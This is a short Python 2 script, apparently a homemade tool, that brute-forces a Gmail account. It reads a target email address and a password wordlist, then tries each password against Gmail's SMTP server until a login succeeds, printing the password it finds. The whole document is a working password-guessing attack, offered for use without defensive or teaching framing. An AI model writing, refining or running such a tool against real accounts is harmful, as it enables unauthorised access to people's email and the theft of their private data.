#S O U F I A N E 

Stop = False 

import smtplib 

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()
print "[S O U F I A N E]"
user = raw_input("Enter Email >")
passwfile = raw_input("Enter Passwordfile >")
passwfile = open(passwfile, "r")

for password in passwfile:
         try:
                smtpserver.login(user, password)
                
                print "password : %s" % password
                break;

         except smtplib.SMTPAuthenticationError:
                 print "[!]Faild: %s" %password 
Stop = True 

